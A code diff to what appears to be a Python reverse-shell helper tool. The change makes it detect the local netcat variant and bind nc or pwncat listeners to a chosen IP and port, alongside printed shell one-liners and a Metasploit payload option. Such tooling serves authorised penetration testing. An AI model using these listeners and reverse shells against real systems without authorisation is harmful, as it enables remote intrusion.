@@ -4,7 +4,7 @@ from urllib import request
 from random import choice, sample
 import signal
 import ipaddress
-from subprocess import Popen
+from subprocess import Popen, PIPE
 
 import netifaces
 
@@ -62,14 +62,14 @@ def ask_listener():
     return ipp, port
 
 
-def shell(listener: str='nc -lvnp yyy'):
+def shell(listener: str):
     """
     Print information on how to spawn a reverse shell and start a listener.
 
     Params
     ------
-    listener : str='nc -lvnp yyy'
-        Optionally define the listener command to use instead of `nc -lvnp yyy` (yyy will be replaced by the port)
+    listener : str
+        Optionally define the listener command to use instead of (xxx will be replaced by the IP address, yyy will be replaced by the port)
     """
     ipp, port = ask_listener()
 
@@ -267,7 +267,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
     command = []
     if os.geteuid() != 0 and int(port) < 1024:
         command.append('sudo')
-    command.extend(listener.replace('yyy', port).split(' '))
+    command.extend(listener.replace('xxx', ipp).replace('yyy', port).split(' '))
     Popen(command).communicate()
 
 
@@ -421,9 +421,16 @@ def main(arg):
     args = parser.parse_args()
     banner()
     if args.use == 'shell':
-        shell()
+        # Try to find correct command line arguments for nc version
+        help_output, help_error = Popen(['nc', '-h'], stdout=PIPE, stderr=PIPE).communicate()
+        help_output = help_output if help_output else help_error
+        if b'https://nmap.org/ncat' in help_output or b'OpenBSD netcat' in help_output:
+            command = 'nc -lvn xxx yyy'
+        else:
+            command = 'nc -s xxx -lvnp yyy'
+        shell(command)
     elif args.use == 'pwncat':
-        shell('pwncat --listen --port yyy')
+        shell('pwncat --listen --host xxx --port yyy')
     elif args.use == 'msf':
         payload()
     elif args.use != 'shell' and args.use != 'msf':
